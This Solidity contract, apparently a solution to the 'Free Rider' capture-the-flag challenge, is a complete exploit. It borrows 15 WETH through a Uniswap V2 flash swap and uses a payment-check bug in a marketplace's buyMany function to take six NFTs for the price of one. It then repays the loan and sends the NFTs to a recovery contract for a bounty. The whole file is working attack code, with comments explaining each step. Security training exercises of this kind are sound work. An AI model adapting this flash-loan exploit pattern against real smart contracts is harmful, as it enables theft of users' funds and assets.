// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace{
    function buyMany(uint256[] calldata tokenIds) external payable; 
}

contract FreeRiderAttack{
    IUniswapV2Pair private immutable pair;
    address private immutable player;
    IFreeRiderNFTMarketplace private immutable market;
    IWETH private immutable weth;
    address private immutable recovery;
    IERC721 private immutable nft;
    uint256 private constant NFT_Price= 15 ether;
    uint256[] private tokens= [0, 1, 2, 3, 4, 5];


constructor(address _market, address _weth, address _uniswap, address _nft, address _recovery){
    //player address
    player = msg.sender;
    //uniswap pair/factory/router address
    pair = IUniswapV2Pair(_uniswap);
    //marketplace address
    market = IFreeRiderNFTMarketplace(_market);
    //tokens address
    weth = IWETH(_weth);
    nft = IERC721(_nft);
    recovery = _recovery;
}



function attack() external payable {
    bytes memory data = abi.encode(NFT_Price);
    pair.swap(NFT_Price, 0, address(this), data);
}


function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
   
//convert weth to eth - ensure we have enough ETH for at least one NFT (15 eth)
    weth.withdraw(NFT_Price);
//call buymany for tokenIDs 0-5 buymany gives us our money back after each buyOnce but we need to have enough eth to pay first run
    market.buyMany{value: NFT_Price}(tokens);

//repay amount is set to include uniswapV2 fee
    uint256 repayAmount = NFT_Price * 1004 / 1000;
//convert eth to weth
    weth.deposit{value: repayAmount}();
//payback flashswap
    weth.transfer(address(pair), repayAmount);
//we need data in this case as this is how it is implemented in our recovery contract - it uses the data to get reward recipient address - which is player
    bytes memory data = abi.encode(player);
//send our NFTS to the recovery contract - beneficiary is player
    for(uint i = 0; i<tokens.length; i++){
        nft.safeTransferFrom(address(this), recovery, i, data);
    }
  
}



function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }


receive() external payable {}

}
